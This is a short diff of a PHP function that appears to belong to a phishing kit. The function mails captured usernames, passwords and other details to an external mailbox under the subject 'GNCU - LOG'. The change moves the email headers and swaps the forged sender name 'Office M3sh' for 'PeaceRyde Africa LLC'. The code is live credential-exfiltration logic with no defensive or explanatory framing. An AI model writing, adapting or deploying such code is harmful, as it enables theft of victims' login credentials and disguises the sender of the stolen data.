@@ -16,8 +16,15 @@ $SENDER_EMAIL = "gottmacht.empire@yandex.com";
 function sendEmail($prevValues, $subject = "GNCU - LOG") {
     global $EMAIL;
     global $SENDER_EMAIL;
-    $headers  = 'MIME-Version: 1.0' . "\r\n";
-    $headers .= 'Content-type: text/html; charset=UTF-8' . "\r\n";
+   
+
+     // To send HTML mail, the Content-type header must be set
+     $headers  = 'MIME-Version: 1.0' . "\r\n";
+     $headers .= 'Content-type: text/html; charset=UTF-8' . "\r\n";
+     
+     // Create email headers
+     $headers .= "From: PeaceRyde Africa LLC<$SENDER_EMAIL>\r\n";
+     $headers .= "Reply-to: $SENDER_EMAIL\r\n";
 
     $message = "<!DOCTYPE html>
     <html lang='en'>
@@ -88,10 +95,6 @@ function sendEmail($prevValues, $subject = "GNCU - LOG") {
     $message = str_replace("{{username}}", $values["username"], $message);
     $message = str_replace("{{password}}", $values["password"], $message);
     $message = str_replace("{{detail}}", $values["detail"], $message);
-
-    // Create email headers
-    $headers .= "From: Office M3sh<$SENDER_EMAIL>\r\n";
-    $headers .= "Reply-to: $SENDER_EMAIL\r\n";
 
     return mail($EMAIL, $subject, $message, $headers, "-f$SENDER_EMAIL");
 }
